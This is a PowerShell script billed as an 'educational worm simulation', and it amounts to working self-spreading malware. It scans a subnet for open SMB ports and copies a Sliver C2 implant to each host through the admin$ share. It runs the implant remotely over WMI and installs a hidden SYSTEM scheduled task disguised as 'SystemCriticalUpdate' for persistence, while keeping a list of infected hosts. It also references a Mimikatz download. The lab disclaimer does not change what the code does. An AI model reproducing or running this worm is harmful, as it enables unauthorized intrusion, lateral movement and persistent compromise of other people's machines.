# SRE.ps1 - Educational Worm Simulation Script
# WARNING: This script is for educational purposes only and should be used in isolated lab environments.
# Unauthorized use of this script is illegal and unethical.

# --- Configuration ---
# Path to the payload executable on the machine running this script
$payloadPath = ".\sliver_payload.exe"
# URL for Sliver C2 payload (example, not used directly for copying local payload)
$sliver_URL = "http://<YOUR_SLIVER_SERVER_IP>/sliver_payload.exe"
# URL for Mimikatz (example, not used directly in this version)
$mimikatz_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"

# Network configuration
$baseIp = "192.168.56."
$startIp = 1
$endIp = 254 # Scan up to 192.168.56.254

# Infection settings
$remotePayloadPath = "C:\Windows\Temp\sliver_payload.exe"
$infectedListFile = ".\infected.txt"
$infectionDelaySeconds = 10 # Optional delay between infection attempts

# --- End Configuration ---

# Function to log messages to console
function Write-Log {
    param (
        [string]$Message,
        [string]$Level = "INFO" # INFO, WARNING, ERROR
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] [$Level] $Message"
}

# Function to test SMB connectivity (port 445)
function Test-SmbConnection {
    param (
        [string]$IpAddress
    )
    try {
        # Test connection to port 445
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connect = $tcpClient.BeginConnect($IpAddress, 445, $null, $null)

        # Wait for max 1 second for connection
        $wait = $connect.AsyncWaitHandle.WaitOne(1000, $false)

        if (-not $wait) {
            $tcpClient.Close()
            Write-Log "Port 445 (SMB) on $IpAddress is closed or unreachable." "WARNING"
            return $false
        }

        $tcpClient.EndConnect($connect)
        $tcpClient.Close()
        Write-Log "Port 445 (SMB) on $IpAddress is open."
        return $true
    }
    catch {
        Write-Log "Error testing SMB connection to $IpAddress: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# Function to copy payload to target
function Copy-Payload {
    param (
        [string]$IpAddress,
        [string]$LocalPayload,
        [string]$RemotePayloadDestPath
    )
    $adminShare = "\\$IpAddress\admin$\Temp\sliver_payload.exe" # Target path using admin share for C:\Windows\Temp
    # Ensure the directory in $RemotePayloadDestPath exists by targeting a file within C:\Windows\Temp directly
    # The actual path on remote machine will be C:\Windows\Temp\sliver_payload.exe

    Write-Log "Attempting to copy payload $LocalPayload to $adminShare..."
    try {
        if (-not (Test-Path $LocalPayload)) {
            Write-Log "Payload file $LocalPayload not found locally. Skipping copy." "ERROR"
            return $false
        }
        Copy-Item -Path $LocalPayload -Destination $adminShare -Force -ErrorAction Stop
        Write-Log "Payload copied successfully to $adminShare (maps to $RemotePayloadDestPath)."
        return $true
    }
    catch {
        Write-Log "Failed to copy payload to $IpAddress: $($_.Exception.Message)" "ERROR"
        # Specific check for network path not found
        if ($_.Exception.Message -like "*Network path not found*") {
            Write-Log "The admin$ share on $IpAddress might not be accessible or does not exist." "WARNING"
        }
        return $false
    }
}

# Function to execute payload remotely using WMI
function Execute-PayloadWmi {
    param (
        [string]$IpAddress,
        [string]$PayloadPathOnTarget
    )
    Write-Log "Attempting to execute payload $PayloadPathOnTarget on $IpAddress via WMI..."
    try {
        # Using Invoke-CimMethod for modern PowerShell if available, otherwise fallback to WMI
        Invoke-CimMethod -ComputerName $IpAddress -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $PayloadPathOnTarget} -ErrorAction Stop
        Write-Log "Payload execution command sent to $IpAddress via CIM."
        return $true
    }
    catch {
        Write-Log "Failed to execute payload on $IpAddress via CIM/WMI: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# Function to establish persistence using a Scheduled Task
function Establish-Persistence {
    param (
        [string]$IpAddress,
        [string]$PayloadPathOnTarget
    )
    Write-Log "Attempting to establish persistence for $PayloadPathOnTarget on $IpAddress..."
    $taskName = "SystemCriticalUpdate" # Benign-sounding task name
    $command = $PayloadPathOnTarget

    # Script block to be executed on the remote machine
    $scriptBlock = {
        param($taskNameParam, $commandParam)
        $action = New-ScheduledTaskAction -Execute $commandParam
        $trigger = New-ScheduledTaskTrigger -AtLogon # Run at user logon
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest # Run with SYSTEM privileges
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden

        try {
            Register-ScheduledTask -TaskName $taskNameParam -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
            Write-Host "Persistence established on remote machine via Scheduled Task '$taskNameParam'."
        }
        catch {
            Write-Host "Failed to establish persistence on remote machine: $($_.Exception.Message)"
        }
    }

    try {
        # Invoke the script block on the remote machine
        Invoke-Command -ComputerName $IpAddress -ScriptBlock $scriptBlock -ArgumentList $taskName, $command -ErrorAction Stop
        Write-Log "Persistence established on $IpAddress via Scheduled Task '$taskName'."
        return $true
    }
    catch {
        Write-Log "Failed to establish persistence on $IpAddress: $($_.Exception.Message)" "ERROR"
        return $false
    }
}


# --- Main Script Logic ---
Write-Log "SRE.ps1 - Educational Worm Simulation Started."

# Create infected list file if it doesn't exist
if (-not (Test-Path $infectedListFile)) {
    Write-Log "Creating infected list file: $infectedListFile"
    New-Item -Path $infectedListFile -ItemType File | Out-Null
}

# Load already infected IPs
$infectedIPs = Get-Content $infectedListFile -ErrorAction SilentlyContinue
Write-Log "Loaded $($infectedIPs.Count) infected IPs from $infectedListFile."

# Main loop for scanning and infection
for ($i = $startIp; $i -le $endIp; $i++) {
    $currentTargetIp = $baseIp + $i
    Write-Log "Scanning target: $currentTargetIp"

    # Skip if already infected
    if ($infectedIPs -contains $currentTargetIp) {
        Write-Log "$currentTargetIp is already in the infected list. Skipping."
        Continue
    }

    # 1. Network Scan: Test SMB connection
    if (Test-SmbConnection -IpAddress $currentTargetIp) {
        Write-Log "Host $currentTargetIp is potentially vulnerable (SMB accessible)."

        # 2. Infection Logic: Copy payload
        if (Copy-Payload -IpAddress $currentTargetIp -LocalPayload $payloadPath -RemotePayloadDestPath $remotePayloadPath) {

            # 3. Infection Logic: Execute payload
            if (Execute-PayloadWmi -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
                Write-Log "Payload executed on $currentTargetIp."

                # 4. Persistence
                if (Establish-Persistence -IpAddress $currentTargetIp -PayloadPathOnTarget $remotePayloadPath) {
                    Write-Log "Persistence established on $currentTargetIp."
                } else {
                    Write-Log "Failed to establish persistence on $currentTargetIp." "WARNING"
                }

                # Add to infected list
                Write-Log "Adding $currentTargetIp to infected list."
                Add-Content -Path $infectedListFile -Value $currentTargetIp
                $infectedIPs += $currentTargetIp # Update in-memory list

                # Optional: Delay
                if ($infectionDelaySeconds -gt 0) {
                    Write-Log "Waiting for $infectionDelaySeconds seconds before next target..."
                    Start-Sleep -Seconds $infectionDelaySeconds
                }
            } else {
                Write-Log "Failed to execute payload on $currentTargetIp." "WARNING"
            }
        } else {
            Write-Log "Failed to copy payload to $currentTargetIp." "WARNING"
        }
    } else {
        Write-Log "Host $currentTargetIp is not accessible over SMB or an error occurred."
    }
    Write-Log "--- Finished processing $currentTargetIp ---"
}

Write-Log "SRE.ps1 - Educational Worm Simulation Finished."
Write-Log "Total infected IPs in this session: $($infectedIPs.Count)"
# End of Script
